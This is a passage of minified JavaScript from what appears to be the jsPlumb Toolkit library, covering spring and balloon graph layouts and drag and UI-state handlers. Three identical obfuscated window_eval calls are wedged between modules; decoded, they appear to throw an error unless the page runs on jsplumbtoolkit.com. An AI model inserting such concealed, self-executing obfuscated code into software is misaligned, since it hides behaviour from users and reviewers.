                    g < .01 && (d = .1 * Math.random() + .1, f = .1 * Math.random() + .1, g = d * d + f * f);
                    var h = Math.sqrt(g);
                    h > e.maxRepulsiveForceDistance && (h = e.maxRepulsiveForceDistance, g = h * h);
                    var i = (g - e.k * e.k) / e.k;
                    (void 0 == b.weight || b.weight < 1) && (b.weight = 1), i *= .5 * Math.log(b.weight) + 1;
                    var j = i * d / h, k = i * f / h;
                    c.f[0] -= c.locked ? 0 : (a.locked ? 2 : 1) * j, c.f[1] -= c.locked ? 0 : (a.locked ? 2 : 1) * k, a.f[0] += a.locked ? 0 : (c.locked ? 2 : 1) * j, a.f[1] += a.locked ? 0 : (c.locked ? 2 : 1) * k
                }
            }, t = function () {
                m = b.width / (j - i) * .62, n = b.height / (l - k) * .62;
                for (var a in f) {
                    var c = f[a];
                    c.locked || (c.sp = v(c.p), b.setPosition(c.id, c.sp[0], c.sp[1], !0))
                }
            }, u = function (a) {
                return [i + (a[0] - .19 * b.width) / m, k + (a[1] - .19 * b.height) / n]
            }, v = function (a) {
                return [.19 * b.width + (a[0] - i) * m, .19 * b.height + (a[1] - k) * n]
            };
        this._nodeMoved = this._groupMoved = function (a, b, c) {
            var d = f[a];
            d && (d.sp = [b, c], d.p = u(d.sp))
        }, this.forceMagnetize = function () {
            for (var a in f) f[a].locked = !1
        }, this.canMagnetize = function (a) {
            return f[a] && !0 !== f[a].locked
        }, this.reset = function () {
            f = {}, h = 0, i = k = 1 / 0, j = l = -1 / 0
        }, this._nodeRemoved = this._groupRemoved = function (a) {
            delete f[a.id]
        }, this._nodeAdded = this._groupAdded = function (a, c) {
            if (c && c.position) {
                var d = p(a.node || a.group);
                d && (d.locked = !0, b.setPosition(d.id, c.position.left, c.position.top, !0))
            }
        }, this.begin = function (a, c) {
            h = 0, d = [], Array.prototype.push.apply(d, b.adapter.getElements())
        }, this.step = function (a, c) {
            var f, i = [], j = function (a) {
                return i[a] ? i[a] : function () {
                    return i[a] = p(d[a]), i[a]
                }()
            };
            for (o = 0, f = 0; f < d.length; f++) {
                var k = j(f);
                if (g && !k.locked) {
                    var l = this.getAbsolutePosition(k.n, c);
                    if (null != l && 2 === l.length && null != l[0] && null != l[1] && !isNaN(l[0]) && !isNaN(l[1])) {
                        q(k, l[0], l[1]), k.sp = k.p, b.setPosition(k.id, l[0], l[1], !0), k.locked = !0;
                        continue
                    }
                }
                for (var m = f + 1; m < d.length; m++) {
                    var n = j(m);
                    r(k, n)
                }
                for (var u = b.toolkit.getAllEdgesFor(k.n).filter(function (a) {
                    return b.adapter.filter(a.target)
                }), v = 0; v < u.length; v++) s(k, u[v])
            }
            if (0 !== o) for (f = 0; f < d.length; f++) {
                var w = j(f), x = e.c * w.f[0], y = e.c * w.f[1], z = e.maxVertexMovement;
                x > z && (x = z), x < -z && (x = -z), y > z && (y = z), y < -z && (y = -z), q(w, w.p[0] + x, w.p[1] + y), w.f[0] = 0, w.f[1] = 0
            }
            h++, (0 === o || h >= e.iterations) && (t(), b.setDone(!0))
        }, this.end = function () {
            for (var a in f) f[a].locked = !0
        }
    }, d.extend(c.Spring, c.AbsoluteBackedLayout)
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = a.jsPlumbToolkit, c = b.Layouts, d = a.Farahey;
    c.Balloon = function (a) {
        a = a || {};
        var b, e = c.AbstractHierarchicalLayout.apply(this, arguments), f = [];
        this.defaultParameters = {padding: 50, locationFunction: a.locationFunction, groupPadding: 100};
        var g = d.getInstance({
            padding: [100, 100], getPosition: function (a) {
                return {left: a.extents[0], top: a.extents[2]}
            }, setPosition: function (a, b) {
                for (var c = 0; c < a.group.length; c++) {
                    var d = a.offsets[a.group[c].id];
                    a.setPosition(a.group[c].id, b.left + d.left, b.top + d.top)
                }
            }, getSize: function (a) {
                return [a.extents[1] - a.extents[0], a.extents[3] - a.extents[2]]
            }, getId: function (a) {
                return a.focus.id
            }, filter: function (a) {
                return f[0].focus.id !== a
            }
        }), h = this.begin;
        this.begin = function (a, c) {
            h.apply(this, arguments), f.length = 0, b = c.getChildEdges
        };
        var i = function (a, c, g) {
            var h, j, k, l, m, n, o = function (a, b, c, d) {
                return {x: a - g.padding, y: b - g.padding, w: c + 2 * g.padding, h: d + 2 * g.padding}
            }, p = {
                focus: a,
                childMap: {},
                children: [],
                positions: {},
                incidentAngles: [],
                setPosition: function (a, b, c) {
                    this.positions[a] = [b, c]
                },
                getPosition: function (a) {
                    return this.positions[a]
                },
                setIncidentAngle: function (a, b) {
                    this.incidentAngles[a] = b
                },
                group: [a]
            }, q = c ? c.position : [0, 0], r = q[0], s = q[1], t = {}, u = function (a) {
                return t[a] || (t[a] = e.getSize(a), t[a])
            };
            p.setPosition(a.id, q[0], q[1]);
            var v = b(a);
            for (h = 0; h < v.length; h++) {
                var w = v[h].target.getNode ? v[h].target.getNode() : v[h].target;
                p.childMap[w.id] || (p.childMap[w.id] = !0, p.children.push(w))
            }
            if (l = u(p.focus.id), k = Math.max(l[0], l[1]), n = o(r - l[0] / 2, s - l[1] / 2, l[0], l[1]), e.setPosition(p.focus.id, -l[0] / 2, -l[1] / 2, !0), p.children.length > 0) {
                f.push(p);
                var x = 2 * Math.PI / (p.children.length + (c ? 1 : 0)),
                    y = c ? c.incidentAngle + Math.PI + x : Math.PI, z = y;
                for (h = 0; h < p.children.length; h++) {
                    j = p.children[h], m = u(j.id);
                    var A = o(r + Math.sin(y) * m[0], s + Math.cos(y) * m[1], m[0], m[1]);
                    if (J = d.calculateSpacingAdjustment(n, A), M = Math.sqrt(Math.pow(A.x + J.left - r, 2) + Math.pow(A.y + J.top - s, 2)), k = Math.max(k, M), p.setPosition(j.id, A.x + J.left, A.y + J.top), y += x, h > 0) {
                        var B = p.children[h - 1], C = u(B.id), D = p.getPosition(B.id), E = o(D[0], D[1], C[0], C[1]),
                            F = p.children[h], G = u(F.id), H = p.getPosition(F.id), I = o(H[0], H[1], G[0], G[1]),
                            J = d.calculateSpacingAdjustment(E, I), K = [D[0] + C[0] / 2, D[1] + C[1] / 2],
                            L = [H[0] + J.left + G[0] / 2, H[1] + J.top + +G[1] / 2],
                            M = Math.sqrt(Math.pow(K[0] - L[0], 2) + Math.pow(K[1] - L[1], 2));
                        k = Math.max(k, M / 2 / Math.sin(x / 2))
                    }
                }
                for (y = z, h = 0; h < p.children.length; h++) j = p.children[h], p.setIncidentAngle(j.id, y), p.setPosition(j.id, r + Math.sin(y) * k, s + Math.cos(y) * k, !0), y += x;
                var N, O = p.positions[a.id][0], P = e.getSize(a.id), Q = O + P[0], R = p.positions[a.id][1],
                    S = R + P[1];
                for (h = 0; h < p.children.length; h++) {
                    j = p.children[h];
                    i(j, {
                        parent: a,
                        incidentAngle: p.incidentAngles[j.id],
                        position: p.positions[j.id]
                    }, g) || (N = e.getSize(j.id), p.group.push(j), O = Math.min(O, p.positions[j.id][0]), Q = Math.max(Q, p.positions[j.id][0] + N[0]), R = Math.min(R, p.positions[j.id][1]), S = Math.max(S, p.positions[j.id][1] + N[1]))
                }
                for (p.extents = [O, Q, R, S], p.offsets = {}, h = 0; h < p.group.length; h++) {
                    var T = p.group[h];
                    p.offsets[T.id] = {
                        left: p.positions[T.id][0] - p.extents[0],
                        top: p.positions[T.id][1] - p.extents[2]
                    }
                }
            }
            return p.children.length
        };
        this.step = function (a, b) {
            if (b.rootNode && b.rootNode.length > 0) {
                if (i(b.rootNode[0], null, b), f.length > 0) {
                    var c = (f[0].extents[0] + f[0].extents[1]) / 2, d = (f[0].extents[2] + f[0].extents[3]) / 2;
                    g.setElements(f), g.execute([c, d])
                }
                for (var h = 0; h < f.length; h++) {
                    var j = f[h];
                    for (var k in j.positions) e.setPosition(k, j.positions[k][0], j.positions[k][1], !0)
                }
            }
            e.setDone(!0)
        }
    }
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = (a.jsPlumb, a.jsPlumbToolkit);
    b.UI = b.UI || {}, b.UI.ActiveDragFilter = function (a, b, c) {
        var d = {};
        b.bind("connectionDrag", function (b) {
            function e(b, e) {
                f = c.beforeConnect(b, e), j = e.getFullId(), !1 === f && null == d[j] && (d[j] = a.setTargetEnabled(e, !1))
            }

            var f, g, h, i, j, k = b.source.jtk.port, l = k ? k.getNode() : b.source.jtk.node, m = c.getNodeCount(),
                n = c.getGroupCount();
            if (k) for (e(k, l), g = l.getPorts(), h = 0; h < g.length; h++) e(k, g[h]);
            for (h = 0; h < m; h++) {
                var o = c.getNodeAt(h);
                for (e(k || l, o), g = o.getPorts(), i = 0; i < g.length; i++) e(k || l, g[i])
            }
            for (h = 0; h < n; h++) {
                var p = c.getGroupAt(h);
                for (e(k || l, p), g = p.getPorts(), i = 0; i < g.length; i++) e(k || l, g[i])
            }
        }), b.bind("connectionDragStop", function () {
            function b(b) {
                !0 === d[b.getFullId()] && a.setTargetEnabled(b, !0)
            }

            var e, f, g, h = c.getNodeCount();
            for (e = 0; e < h; e++) {
                var i = c.getNodeAt(e);
                for (b(i), f = i.getPorts(), g = 0; g < f.length; g++) b(f[g])
            }
            var j = c.getGroupCount();
            for (e = 0; e < j; e++) {
                var k = c.getGroupAt(e);
                for (b(k), f = k.getPorts(), g = 0; g < f.length; g++) b(f[g])
            }
            d = {}
        })
    }
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = a.jsPlumbToolkit.Renderers, c = a.jsPlumbToolkit, d = a.jsPlumbToolkitUtil, e = a.jsPlumbUtil,
        f = a.jsPlumb, g = a.Rotors, h = c.Constants;
    c.UIState = function (a, b, c) {
        for (var d in b) if (b.hasOwnProperty(d)) {
            var e = "*" === d ? "e-state-" + a : "e-state-" + a + "-" + d,
                f = "*" === d ? "c-state-" + a : "c-state-" + a + "-" + d;
            c.registerEndpointType(e, b[d]), c.registerConnectionType(f, b[d])
        }
        this.activate = function (d, e, f) {
            d.eachEdge(function (c, d) {
                var h = e.getRenderedConnection(d.getId()), i = f.getEdgeType(d.data),
                    j = i ? "c-state-" + a + "-" + i : null;
                j && h.addType(j, d.data), b["*"] && h.addType("c-state-" + a, d.data), g(d, h, d.source, 0, "addType", f), g(d, h, d.target, 1, "addType", f)
            }), d.eachNode(function (a, d) {
                var g = f.getNodeType(d.data), h = g ? b[g] : null, i = e.getRenderedNode(d.id);
                h && h.cssClass && c.addClass(i, h.cssClass), b["*"] && c.addClass(i, b["*"].cssClass)
            })
        };
        var g = function (b, c, d, e, f, g) {
            var h = c.endpoints[e], i = g.getPortType(d.data);
            h[f]("e-state-" + a + "-" + i), h[f]("e-state-" + a)
        };
        this.deactivate = function (d, e, f) {
            d.eachEdge(function (c, d) {
                var h = e.getRenderedConnection(d.getId()), i = f.getEdgeType(d.data),
                    j = i ? "c-state-" + a + "-" + i : null;
                j && h.removeType(j, d.data), b["*"] && h.removeType("c-state-" + a), g(d, h, d.source, 0, "removeType", f), g(d, h, d.target, 1, "removeType", f)
            }), d.eachNode(function (a, d) {
                var g = f.getNodeType(d.data), h = g ? b[g] : null, i = e.getRenderedNode(d.id);
                h && h.cssClass && c.removeClass(i, h.cssClass), b["*"] && c.removeClass(i, b["*"].cssClass)
            })
        }
    };
    var i = b.atts = {NODE: "data-jtk-node-id", PORT: "data-jtk-port-id", GROUP: "data-jtk-group-id"},
        j = b.els = {SOURCE: "JTK-SOURCE", PORT: "JTK-PORT", TARGET: "JTK-TARGET"}, k = c.Classes, h = c.Constants,
        l = c.Events;
